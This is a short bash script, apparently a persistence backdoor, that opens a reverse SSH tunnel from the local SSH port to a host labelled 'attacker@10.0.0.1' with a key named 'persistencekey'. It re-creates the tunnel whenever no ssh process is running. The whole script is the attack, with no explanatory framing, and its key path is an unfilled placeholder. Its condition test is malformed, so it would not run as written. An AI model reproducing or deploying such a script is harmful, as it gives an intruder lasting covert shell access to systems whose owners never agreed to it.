#!/bin/bash
createTunnel(){
  /usr/bin/ssh -N -R 31337:localhost:22 attacker@10.0.0.1 -i 
      <SSH Key File Location (/root/.ssh/persistencekey)
}
/bin/pidof ssh
if [[$? -ne 0]]; then
  createTunnel
  fi
